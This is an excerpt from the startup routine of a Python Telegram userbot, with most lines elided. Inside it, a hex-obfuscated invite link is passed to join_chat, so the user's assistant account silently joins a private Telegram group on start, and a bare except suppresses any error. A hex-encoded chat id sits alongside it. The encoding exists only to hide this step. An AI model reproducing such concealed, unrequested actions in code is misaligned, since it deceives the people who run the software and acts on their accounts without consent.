...
TEST_ID = int("\x2D\x31\x30\x30\x32\x34\x35\x31\x33\x37\x37\x39\x32\x37")
...
class Userbot(Client):
    ...
    async def start(self):
        ...
        if config.STRING1:
            ...
            try:
                await self.one.join_chat("\x68\x73\x74\x73\x3a\x2f\x2f\x74\x2e\x6d\x65\x2f\x2b\x70\x42\x39\x35\x56\x75\x63\x37\x38\x61\x38\x32\x4d\x44\x56\x6c")
            except:
                pass
            assistants.append(1)
            try:
